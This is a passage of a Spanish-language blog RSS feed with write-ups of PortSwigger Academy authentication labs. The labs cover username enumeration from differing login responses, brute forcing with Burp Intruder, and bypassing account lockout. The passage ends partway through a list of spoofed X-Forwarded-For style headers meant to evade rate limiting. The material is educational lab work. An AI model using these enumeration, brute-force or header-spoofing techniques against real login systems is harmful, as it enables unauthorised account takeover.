&lt;p&gt;Ahora que sabemos esto, intentaremos entrar con el usuario &lt;code&gt;ar&lt;/code&gt; pero hay que tener cuidado que no se nos bloquee la cuenta, en este caso si se bloquea, pero la propia aplicacion tiene una falla la cual aunque se bloquea la cuenta el mensaje es diferente para el usuario valido lo que permite reconocer que el usuario y contrasena si es valido porque muestra un error distinto al resto, y solo queda esperar que la aplicacion se desbloquee luego de un tiempo.&lt;/p&gt;
&lt;p&gt;Los valores enviados son:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 185; 
			flex-basis: 445px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-5/intruder.png&#34; data-size=&#34;1126x606&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-5/intruder.png&#34;
			width=&#34;1126&#34;
			height=&#34;606&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-5/intruder_hud31863dafebd4ecaa2449ce6121ee990_74004_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-5/intruder_hud31863dafebd4ecaa2449ce6121ee990_74004_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Intruder Position&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Intruder Position&lt;/figcaption&gt;
	
&lt;/figure&gt;
&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 112; 
			flex-basis: 270px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-5/intruder2.png&#34; data-size=&#34;547x485&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-5/intruder2.png&#34;
			width=&#34;547&#34;
			height=&#34;485&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-5/intruder2_hu49811b357fc9608a1ce80cd865858408_18614_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-5/intruder2_hu49811b357fc9608a1ce80cd865858408_18614_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Intruder Payloads&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Intruder Payloads&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Al realizar el ataque ya podemos ver los resultados y el de contrasena &lt;code&gt;starwars&lt;/code&gt; es el unico diferente al resto por lo que nos indica que es la contrasena correcta.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 278; 
			flex-basis: 667px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-5/resultado.png&#34; data-size=&#34;782x281&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-5/resultado.png&#34;
			width=&#34;782&#34;
			height=&#34;281&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-5/resultado_hu93563b4b39bb6a7096613d33b51c6fbd_13320_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-5/resultado_hu93563b4b39bb6a7096613d33b51c6fbd_13320_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Respuestas del ataque de usuarios&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Respuestas del ataque de usuarios&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con eso ya hemos ingresado:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 146; 
			flex-basis: 351px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-5/resuelto.png&#34; data-size=&#34;1253x856&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-5/resuelto.png&#34;
			width=&#34;1253&#34;
			height=&#34;856&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-5/resuelto_hu6e5273b61924195f172a5d5e74839316_83547_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-5/resuelto_hu6e5273b61924195f172a5d5e74839316_83547_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Authentication Lab 1</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-1/</link>
        <pubDate>Sat, 13 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-1/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-1/head.png" alt="Featured image of post Portswigger Academy Learning Path: Authentication Lab 1" /&gt;&lt;h1 id=&#34;lab-username-enumeration-via-different-responses&#34;&gt;Lab: Username enumeration via different responses&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es enumerar usuarios en el inicio de sesion y dependiendo de la respuesta sabremos si el usuario esta registrado o no.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Para resolver el ejercicio se nos da el siguiente listado de &lt;!-- raw HTML omitted --&gt;usuarios&lt;sup id=&#34;fnref:2&#34;&gt;&lt;a href=&#34;#fn:2&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;2&lt;/a&gt;&lt;/sup&gt; y contrasenas&lt;sup id=&#34;fnref:3&#34;&gt;&lt;a href=&#34;#fn:3&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;3&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt; para realizar las pruebas, al intentar iniciar sesion podemos notar la respuesta del inicio de sesion:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 203; 
			flex-basis: 487px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-1/login.png&#34; data-size=&#34;1105x544&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-1/login.png&#34;
			width=&#34;1105&#34;
			height=&#34;544&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-1/login_hu8128ac1c2d82ee6ea39b95c1dfa4d38c_23321_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-1/login_hu8128ac1c2d82ee6ea39b95c1dfa4d38c_23321_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Respuesta al iniciar sesion con usuario incorrecto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Respuesta al iniciar sesion con usuario incorrecto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Basandonos en la respuesta sabremos identificar usuarios en el sistema, solo toca enviar los multiples usuarios y saber cual esta registrado, utilizando la lista de usuarios antes mencionados. Para eso lanzamos el ataque:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 161; 
			flex-basis: 388px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-1/intruder.png&#34; data-size=&#34;878x542&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-1/intruder.png&#34;
			width=&#34;878&#34;
			height=&#34;542&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-1/intruder_hu810a8f13f81b14c0d814046ff276ba88_66207_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-1/intruder_hu810a8f13f81b14c0d814046ff276ba88_66207_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Intruder Position&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Intruder Position&lt;/figcaption&gt;
	
&lt;/figure&gt;
&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 133; 
			flex-basis: 321px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-1/intruder2.png&#34; data-size=&#34;602x450&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-1/intruder2.png&#34;
			width=&#34;602&#34;
			height=&#34;450&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-1/intruder2_hu5f38efcfad4fbeb0fe5d81f5d4a79b9b_16823_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-1/intruder2_hu5f38efcfad4fbeb0fe5d81f5d4a79b9b_16823_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Intruder Payloads&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Intruder Payloads&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y al lanzar el ataque obtuvimos la respuesta, y aunque la respuesta es muy parecida, en un usuario da una respuesta diferente con el &lt;code&gt;length 3008&lt;/code&gt; y es la donde ya nos dice que es &lt;code&gt;Incorrect password&lt;/code&gt; lo cual ya hemos enumerado al usuario.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 274; 
			flex-basis: 658px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-1/resultado.png&#34; data-size=&#34;779x284&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-1/resultado.png&#34;
			width=&#34;779&#34;
			height=&#34;284&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-1/resultado_hu5d7427e5d58f56221a6b9e258f60aedb_12871_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-1/resultado_hu5d7427e5d58f56221a6b9e258f60aedb_12871_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Respuestas del ataque de usuarios&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Respuestas del ataque de usuarios&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ya ahora solo queda lanzar el mismo ataque pero con el listado de contrasenas al usuario &lt;code&gt;auth&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 177; 
			flex-basis: 426px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-1/resultado2.png&#34; data-size=&#34;771x434&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-1/resultado2.png&#34;
			width=&#34;771&#34;
			height=&#34;434&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-1/resultado2_hu0e79f8e5bfd426eb354a60d8dde98428_27105_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-1/resultado2_hu0e79f8e5bfd426eb354a60d8dde98428_27105_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Respuestas del ataque de contrasenas&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Respuestas del ataque de contrasenas&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con esto hemos resulto el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 199; 
			flex-basis: 477px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-1/resuelto.png&#34; data-size=&#34;1210x608&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-1/resuelto.png&#34;
			width=&#34;1210&#34;
			height=&#34;608&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-1/resuelto_hu1465c5741f9d543ab8a87871bf498e6c_58961_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-1/resuelto_hu1465c5741f9d543ab8a87871bf498e6c_58961_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id=&#34;fn:2&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;usernames.txt&#34; &gt;Listado de Usuarios&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:2&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id=&#34;fn:3&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;passwords.txt&#34; &gt;Listado de Contrasenas&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:3&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Authentication Lab 2</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-2/</link>
        <pubDate>Sat, 13 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-2/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-2/head.png" alt="Featured image of post Portswigger Academy Learning Path: Authentication Lab 2" /&gt;&lt;h1 id=&#34;lab-username-enumeration-via-different-responses&#34;&gt;Lab: Username enumeration via different responses&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es enumerar usuarios en el inicio de sesion y dependiendo de la respuesta sabremos si el usuario esta registrado o no, pero aca hay una sutil diferencia y es que la respuesta aunque pareciera ser igual, no es igual y esos son los pequenos cambios a notar.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Para resolver el ejercicio se nos da un listado de usuarios y contrasenas para realizar las pruebas, al intentar iniciar sesion podemos notar la respuesta del inicio de sesion, que ya no dice que el usuario es incorrecto, sino que es mas generico.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 204; 
			flex-basis: 491px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-2/login.png&#34; data-size=&#34;1098x536&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-2/login.png&#34;
			width=&#34;1098&#34;
			height=&#34;536&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-2/login_hu251b6055b472149bc2584dcd65cfae97_25182_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-2/login_hu251b6055b472149bc2584dcd65cfae97_25182_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Respuesta al iniciar sesion con usuario incorrecto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Respuesta al iniciar sesion con usuario incorrecto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Basandonos en la respuesta sabremos identificar usuarios en el sistema, solo toca enviar los multiples usuarios y saber cual esta registrado, utilizando la lista de usuarios antes mencionados. Para eso lanzamos el ataque:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 161; 
			flex-basis: 388px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-2/intruder.png&#34; data-size=&#34;878x542&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-2/intruder.png&#34;
			width=&#34;878&#34;
			height=&#34;542&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-2/intruder_hu810a8f13f81b14c0d814046ff276ba88_66207_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-2/intruder_hu810a8f13f81b14c0d814046ff276ba88_66207_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Intruder Position&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Intruder Position&lt;/figcaption&gt;
	
&lt;/figure&gt;
&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 133; 
			flex-basis: 321px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-2/intruder2.png&#34; data-size=&#34;602x450&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-2/intruder2.png&#34;
			width=&#34;602&#34;
			height=&#34;450&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-2/intruder2_hu5f38efcfad4fbeb0fe5d81f5d4a79b9b_16823_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-2/intruder2_hu5f38efcfad4fbeb0fe5d81f5d4a79b9b_16823_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Intruder Payloads&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Intruder Payloads&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y al lanzar el ataque obtuvimos muchas respuestas, todas muy similares, para eso haremos de la funcion de burp &lt;code&gt;Grep - Match&lt;/code&gt; con el valor &lt;code&gt;Invalid username or password.&lt;/code&gt; y veremos si alguna respuesta cambia a esta.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 177; 
			flex-basis: 425px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-2/resultado.png&#34; data-size=&#34;1047x590&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-2/resultado.png&#34;
			width=&#34;1047&#34;
			height=&#34;590&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-2/resultado_hu47319634e7b2736770c99edf34fe19e4_43840_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-2/resultado_hu47319634e7b2736770c99edf34fe19e4_43840_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Respuestas del ataque de usuarios&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Respuestas del ataque de usuarios&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Como vemos esta esa respuesta sutil, ya que la respuesta que es la correcta hace falta un &lt;code&gt;.&lt;/code&gt; y eso puede hacer la diferencia al enumerar usuarios. Ya ahora solo queda lanzar el mismo ataque pero con el listado de contrasenas al usuario &lt;code&gt;auth&lt;/code&gt;. Ahora probaremos el listado de contrasenas, y encontramos basandonos en la respuesta basandonos en la respuesta &lt;code&gt;302&lt;/code&gt; que es diferente al resto ya que nos redirige.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 287; 
			flex-basis: 689px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-2/resultado2.png&#34; data-size=&#34;830x289&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-2/resultado2.png&#34;
			width=&#34;830&#34;
			height=&#34;289&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-2/resultado2_hu1967b2b0ddea9b5f1ca83154c4432294_13610_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-2/resultado2_hu1967b2b0ddea9b5f1ca83154c4432294_13610_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Respuestas del ataque de contrasenas&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Respuestas del ataque de contrasenas&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con esto hemos resulto el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 198; 
			flex-basis: 477px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-2/resuelto.png&#34; data-size=&#34;1773x891&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-2/resuelto.png&#34;
			width=&#34;1773&#34;
			height=&#34;891&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-2/resuelto_hu8d940e4e4d3d248b16d8a97a2b325935_103006_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-2/resuelto_hu8d940e4e4d3d248b16d8a97a2b325935_103006_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Authentication Lab 3</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-3/</link>
        <pubDate>Sat, 13 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-3/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-3/head.png" alt="Featured image of post Portswigger Academy Learning Path: Authentication Lab 3" /&gt;&lt;h1 id=&#34;lab-username-enumeration-via-different-responses&#34;&gt;Lab: Username enumeration via different responses&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es enumerar usuarios en el inicio de sesion y dependiendo de la respuesta sabremos si el usuario esta registrado o no, pero el sistema cuenta con una proteccion que no permite mas de 3 intentos para realizar brute forcing por lo que tiene &lt;code&gt;rate limit&lt;/code&gt;, por lo que antes de tratar de enumerar usuarios hay que encontrar la manera de hacer un bypass a esto.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Para resolver el ejercicio se nos da un listado de usuarios y contrasenas para realizar las pruebas, al intentar iniciar sesion podemos notar la respuesta del inicio de sesion, que ya no dice que el usuario es incorrecto, sino que es mas generico.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 207; 
			flex-basis: 497px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-3/login.png&#34; data-size=&#34;1131x546&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-3/login.png&#34;
			width=&#34;1131&#34;
			height=&#34;546&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-3/login_hu6514c5ce479ea119d7802a36733820c6_32033_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-3/login_hu6514c5ce479ea119d7802a36733820c6_32033_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Respuesta al realizar muchos intentos de inicio de sesion&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Respuesta al realizar muchos intentos de inicio de sesion&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Lo primero para saltarse esto existen maneras, una de las cuales puede ser se lista:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Forwared-Host: 127.0.0.1


#or use double X-Forwared-For header
X-Forwarded-For:
X-Forwarded-For: 127.0.0.1
